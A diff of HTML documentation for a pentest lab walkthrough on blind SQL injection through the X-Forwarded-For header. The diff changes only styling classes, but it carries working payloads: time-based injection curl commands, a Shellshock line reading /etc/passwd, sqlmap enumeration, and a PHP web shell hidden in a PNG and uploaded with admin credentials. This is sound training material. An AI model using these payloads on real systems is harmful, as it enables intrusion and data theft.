@@ -129,7 +129,7 @@
 <li class="toctree-l3"><a class="reference internal" href="#how-sql-injection-ii-differs-from-i">3.23.1. how SQL injection II differs from I</a></li>
 <li class="toctree-l3"><a class="reference internal" href="#sql-ii-reconnaissance">3.23.2. SQL II reconnaissance</a></li>
 <li class="toctree-l3"><a class="reference internal" href="#testing-for-sql-injection">3.23.3. testing for SQL injection</a></li>
-<li class="toctree-l3"><a class="reference internal" href="#sqlmap-to-the-rescue">3.23.4. <code class="docutils literal"><span class="pre">sqlmap</span></code> to the rescue</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#sqlmap-to-the-rescue">3.23.4. <code class="docutils literal notranslate"><span class="pre">sqlmap</span></code> to the rescue</a></li>
 <li class="toctree-l3"><a class="reference internal" href="#uploading-the-vulnerable-php-script">3.23.5. uploading the vulnerable php script</a></li>
 </ul>
 </li>
@@ -223,15 +223,15 @@
 <p>The setup looks much the same for both SQL injection exercises except for two key differences:</p>
 <ul>
 <li><p class="first">In SQL I the injection is performed on a query parameter:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span>curl http://<span class="nv">$TARGET</span>/cat.php?id<span class="o">=</span><span class="nv">$INJECTION</span>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>curl http://<span class="nv">$TARGET</span>/cat.php?id<span class="o">=</span><span class="nv">$INJECTION</span>
 </pre></div>
 </div>
 <p>whereas in SQL II the injection is done via the http header field X-Forwarded-For:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span>curl --header <span class="s2">&quot;X-Forwarded-For: </span><span class="nv">$INJECTION</span><span class="s2">&quot;</span> http://<span class="nv">$TARGET</span>/
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>curl --header <span class="s2">&quot;X-Forwarded-For: </span><span class="nv">$INJECTION</span><span class="s2">&quot;</span> http://<span class="nv">$TARGET</span>/
 </pre></div>
 </div>
 <p>Vulnerable http header fields should not come as a complete surprise as the <a class="reference external" href="http://blog.cloudflare.com/inside-shellshock/">Shellshock bash exploit used the User-Agent header field</a>:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span>curl -H <span class="s2">&quot;User-Agent: () { :; }; /bin/cat /etc/passwd&quot;</span> http://example.com/
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>curl -H <span class="s2">&quot;User-Agent: () { :; }; /bin/cat /etc/passwd&quot;</span> http://example.com/
 </pre></div>
 </div>
 </li>
@@ -239,7 +239,7 @@
 </li>
 </ul>
 <p>How did Shell II turn the benign X-Forwarded-For field into an attack vector? It added stats.php to update stats based on client IP:</p>
-<div class="highlight-php"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+<div class="highlight-php notranslate"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
 
   <span class="nv">$ip</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">];</span>
 
@@ -268,7 +268,7 @@
 <li>on Debian Linux Squeeze (6.0.7) using kernel 2.6.32-5</li>
 </ul>
 <p>The nginx and php versions are obvious from the console listing below. But how did we get the Debian Linux 6.0.7 and specific kernel version? Well, we start with the php information. Debian <a class="reference external" href="https://lists.debian.org/debian-changes/2013/03/msg00009.html">Accepted php5 5.3.3-7+squeeze15</a> (the php version the vulnerable server uses) on 2013-03-04  and <a class="reference external" href="https://lists.debian.org/debian-changes/2013/07/msg00037.html">Accepted php5 5.3.3-7+squeeze16</a> (the following version) 2013-07-24. That tells us that the Debian version was prior to 2013-07-24. Looking at <a class="reference external" href="https://wiki.debian.org/DebianSqueeze">Debian Squeeze Releases and Updates</a> shows Debian Squeeze 6.0.8 was released 2013-10-20 (too late) but Squeeze 6.0.7 was released 2013-02-23 and likely was patched to php5 5.3.3-7+squeeze15 after installation. So the vulnerable server runs Debian Squeeze 6.0.7. Looking at the <a class="reference external" href="https://www.debian.org/News/2013/20130223">Debian 6.0.7 press release</a> shows linux-2.6 2.6.32-48 and a little searching showed the <a class="reference external" href="https://packages.debian.org/search?searchon=sourcenames&amp;keywords=linux-2.6">squeeze 2.6 kernel</a> used 2.6.32-5. It’s interesting how much information leaks out by providing software versions.</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$ #</span> nmap to see an nginx web server running on linux
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$ #</span> nmap to see an nginx web server running on linux
 <span class="gp">hacker@kali:~$</span> <span class="nv">TARGET</span><span class="o">=</span><span class="m">192</span>.168.1.102
 <span class="gp">hacker@kali:~$</span> sudo nmap -Pn -sV -O <span class="nv">$TARGET</span>
 <span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
@@ -313,7 +313,7 @@
 <div class="section" id="testing-for-sql-injection">
 <h2>3.23.3. testing for SQL injection<a class="headerlink" href="#testing-for-sql-injection" title="Permalink to this headline">¶</a></h2>
 <p>The SQL injection involves setting the X-Forwarded-For field. Here are 3 simple ways of doing that:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="c1"># socat sending X-Forwarded-For</span>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># socat sending X-Forwarded-For</span>
 <span class="nv">TARGET</span><span class="o">=</span><span class="m">192</span>.168.1.102
 cat &gt; head.txt <span class="s">&lt;&lt;EOF</span>
 <span class="s">HEAD / HTTP/1.1</span>
@@ -332,9 +332,9 @@ wget --header <span class="s2">&quot;X-Forwarded-For: 123.123.123.123&quot;</spa
      --spider --tries <span class="m">1</span> http://<span class="nv">$TARGET</span>/
 </pre></div>
 </div>
-<p>We’ll use <code class="docutils literal"><span class="pre">curl</span></code> to probe for SQL injection opportunities. First we’ll guess that the database is MySQL (which is often true for PHP-based systems). That means we’ll be using MySQL queries: if they work then we know it’s MySQL, if not we’ll have to try a different database.</p>
+<p>We’ll use <code class="docutils literal notranslate"><span class="pre">curl</span></code> to probe for SQL injection opportunities. First we’ll guess that the database is MySQL (which is often true for PHP-based systems). That means we’ll be using MySQL queries: if they work then we know it’s MySQL, if not we’ll have to try a different database.</p>
 <p>Since X-Forwarded-For is an IP it’s text and we’ll assume our injection closes the X-Forwarded-For field with a single quote mark. We try “hacker’” first and see there’s no change in the output. So then we try adding a “sleep(5)” and see a delay, confirming the SQL injection and a likely MySQL database. Here is the code you can cut-and-paste into your terminal session (except for the TARGET):</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">TARGET</span><span class="o">=</span><span class="m">192</span>.168.1.102
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">TARGET</span><span class="o">=</span><span class="m">192</span>.168.1.102
 <span class="nv">XFF</span><span class="o">=</span><span class="s2">&quot;X-Forwarded-For: &quot;</span>
 <span class="nv">t1</span><span class="o">=</span><span class="k">$(</span>date +%s<span class="k">)</span>
 <span class="nv">INJECT</span><span class="o">=</span><span class="s2">&quot;hacker&#39;&quot;</span>
@@ -348,7 +348,7 @@ curl --silent --header <span class="s2">&quot;</span><span class="si">${</span><
 </pre></div>
 </div>
 <p>Here is result of running the code above (showing the time delay):</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$</span> <span class="nv">TARGET</span><span class="o">=</span><span class="m">192</span>.168.1.102
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$</span> <span class="nv">TARGET</span><span class="o">=</span><span class="m">192</span>.168.1.102
 <span class="gp">hacker@kali:~$ t1=$</span><span class="o">(</span>date +%s<span class="o">)</span>
 <span class="gp">hacker@kali:~$</span> <span class="nv">INJECT</span><span class="o">=</span><span class="s2">&quot;hacker&#39;&quot;</span>
 <span class="gp">hacker@kali:~$</span> curl --silent --header <span class="s2">&quot;</span><span class="si">${</span><span class="nv">XFF</span><span class="si">}${</span><span class="nv">INJECT</span><span class="si">}</span><span class="s2">&quot;</span> -o /dev/null http://<span class="nv">$TARGET</span>/
@@ -363,7 +363,7 @@ curl --silent --header <span class="s2">&quot;</span><span class="si">${</span><
 </pre></div>
 </div>
 <p>Now we can clumsily play a game of “20 questions” with the database - if we guess right it will induce a delay or return immediately if we guess wrong. Let’s say we have inched along and now know there is a database called users with columns id, login, and password. We can enumerate the users by selecting id = 1 and asking if the length of login is 1, 2, 3, … on up until we get a delay at 5 (for “admin”). Then in a loop we can inquire about the value of each of the characters, going from 1 to 5: is it “a”, “b”, …  until the delay shows us the actual character. If we want to optimize the search, we can convert each character to a binary number and ask if each bit is a 1? That way takes less checks to determine that the letters are “a”, “d”, “m”, “i”, and “n”. Using bits is faster with ascii characters (which have 7 bits); it takes 7 guesses * 5 letters = 35 guesses. Guessing each letter would have taken 1+4+13+9+14=41 guesses (and it gets worse if you allow digits and special characters in the login). Here we show a query verifying the 3rd character of the first login is “m”:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">TARGET</span><span class="o">=</span><span class="m">192</span>.168.1.102
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">TARGET</span><span class="o">=</span><span class="m">192</span>.168.1.102
 <span class="nv">XFF</span><span class="o">=</span><span class="s2">&quot;X-Forwarded-For: &quot;</span>
 <span class="nv">t1</span><span class="o">=</span><span class="k">$(</span>date +%s<span class="k">)</span>
 <span class="nv">INJECT</span><span class="o">=</span><span class="s2">&quot;hacker&#39; OR if ( (SELECT substring(login,3,1) FROM users \</span>
@@ -375,9 +375,9 @@ curl --silent --header <span class="s2">&quot;</span><span class="si">${</span><
 </div>
 </div>
 <div class="section" id="sqlmap-to-the-rescue">
-<h2>3.23.4. <code class="docutils literal"><span class="pre">sqlmap</span></code> to the rescue<a class="headerlink" href="#sqlmap-to-the-rescue" title="Permalink to this headline">¶</a></h2>
+<h2>3.23.4. <code class="docutils literal notranslate"><span class="pre">sqlmap</span></code> to the rescue<a class="headerlink" href="#sqlmap-to-the-rescue" title="Permalink to this headline">¶</a></h2>
 <p>This is tedious and begs to be automated; <a class="reference external" href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">sqlmap</a> has done that. Give it a hint to use X-Forwarded-For and it will find the SQL injection, returning the database banner (so you’ll know the version).</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$</span> sqlmap -u <span class="s2">&quot;http://</span><span class="nv">$TARGET</span><span class="s2">/&quot;</span> --headers<span class="o">=</span><span class="s2">&quot;X-Forwarded-For: *&quot;</span> <span class="se">\</span>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$</span> sqlmap -u <span class="s2">&quot;http://</span><span class="nv">$TARGET</span><span class="s2">/&quot;</span> --headers<span class="o">=</span><span class="s2">&quot;X-Forwarded-For: *&quot;</span> <span class="se">\</span>
     --banner --batch --output-dir <span class="nv">$PWD</span>/sqlmap
 <span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
 <span class="go">[*] starting at 23:12:15</span>
@@ -403,7 +403,7 @@ curl --silent --header <span class="s2">&quot;</span><span class="si">${</span><
 </pre></div>
 </div>
 <p>Now we continue on as before to list the databases, tables, and users.</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$</span> sqlmap -u <span class="s2">&quot;http://</span><span class="nv">$TARGET</span><span class="s2">/&quot;</span> --headers<span class="o">=</span><span class="s2">&quot;X-Forwarded-For: *&quot;</span> <span class="se">\</span>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$</span> sqlmap -u <span class="s2">&quot;http://</span><span class="nv">$TARGET</span><span class="s2">/&quot;</span> --headers<span class="o">=</span><span class="s2">&quot;X-Forwarded-For: *&quot;</span> <span class="se">\</span>
     --dbs --batch --output-dir <span class="nv">$PWD</span>/sqlmap
 <span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
 <span class="go">available databases [2]:</span>
@@ -439,8 +439,8 @@ curl --silent --header <span class="s2">&quot;</span><span class="si">${</span><
 </div>
 <div class="section" id="uploading-the-vulnerable-php-script">
 <h2>3.23.5. uploading the vulnerable php script<a class="headerlink" href="#uploading-the-vulnerable-php-script" title="Permalink to this headline">¶</a></h2>
-<p>Consult the challenges documentation for issues about uploading files to an nginx/PHP server. Basically, we embed the php page “&lt;?php system($_GET[‘cmd’]); ?&gt;” in a copy of the existing image file hacker.png using <code class="docutils literal"><span class="pre">exiftool</span></code>. Then we upload it using our admin/P4ssw0rd account, figure out the uploaded file’s name (it’s changed), then use it to execute commands by fetching “<a class="reference external" href="http://$TARGET/admin/uploads">http://$TARGET/admin/uploads</a>/${uploaded}/x.php?cmd=COMMAND”. At this point the exploit is done: we can execute arbitrary shell commands with the permissions of the web server.</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$</span> <span class="nv">TARGET</span><span class="o">=</span><span class="m">192</span>.168.1.102
+<p>Consult the challenges documentation for issues about uploading files to an nginx/PHP server. Basically, we embed the php page “&lt;?php system($_GET[‘cmd’]); ?&gt;” in a copy of the existing image file hacker.png using <code class="docutils literal notranslate"><span class="pre">exiftool</span></code>. Then we upload it using our admin/P4ssw0rd account, figure out the uploaded file’s name (it’s changed), then use it to execute commands by fetching “<a class="reference external" href="http://$TARGET/admin/uploads">http://$TARGET/admin/uploads</a>/${uploaded}/x.php?cmd=COMMAND”. At this point the exploit is done: we can execute arbitrary shell commands with the permissions of the web server.</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$</span> <span class="nv">TARGET</span><span class="o">=</span><span class="m">192</span>.168.1.102
 <span class="gp">hacker@kali:~$</span> curl --silent -o hacker.png http://<span class="nv">$TARGET</span>/admin/uploads/hacker.png
 <span class="gp">hacker@kali:~$</span> <span class="nb">echo</span> <span class="s2">&quot;&lt;?php system(\$_GET[&#39;cmd&#39;]); ?&gt;&quot;</span> &gt; shell.php
 <span class="gp">hacker@kali:~$</span> exiftool <span class="s2">&quot;-comment&lt;=shell.php&quot;</span> hacker.png
